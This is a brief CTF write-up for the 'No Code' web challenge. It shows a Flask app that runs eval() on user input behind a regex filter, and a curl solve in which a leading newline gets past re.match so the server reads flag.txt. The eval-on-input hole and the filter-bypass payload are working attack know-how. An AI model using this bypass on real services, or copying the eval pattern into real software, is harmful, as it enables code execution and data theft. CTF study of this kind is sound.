# web/No Code
`Points: 362`

### Description
```
I made a web app that lets you run any code you want. Just kidding!

Author: SteakEnthusiast

https://uoftctf-no-code.chals.io/
```

#### app.py
```py
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

## Solve

```shell
~ % curl 'https://uoftctf-no-code.chals.io/execute' \
--form 'code="
open(\"flag.txt\", \"r\").read()"'
```